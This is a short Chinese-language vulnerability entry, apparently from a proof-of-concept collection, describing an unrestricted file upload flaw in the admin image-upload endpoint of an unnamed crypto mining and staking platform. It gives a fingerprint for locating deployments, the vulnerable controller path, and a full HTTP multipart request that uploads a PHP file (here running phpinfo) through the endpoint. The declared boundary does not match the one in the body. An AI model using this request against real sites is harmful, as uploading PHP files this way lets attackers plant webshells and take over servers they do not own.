# 某U挖矿质押单语言系统imageupload后台任意文件上传漏洞

- **系统**：某U挖矿质押单语言系统imageupload后台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"/static/index/css/login/framework7.ios.min.css"`
- **请求**：`POST /admin/news/imageupload HTTP/1.1`

**请求体 / payload**
```
位于 /admin/controller/News.php 控制器的 imageupload 方法存在一个很明显的上传文件操作file()，且无任何限制，导致漏洞产生
POC:
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryydBYM59rmMIhj0gw
Cookie: PHPSESSID=jt6bie950imjojfm9aj6hpfl10
Host: 127.0.0.1:81
------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```
- **预期**：200　|　—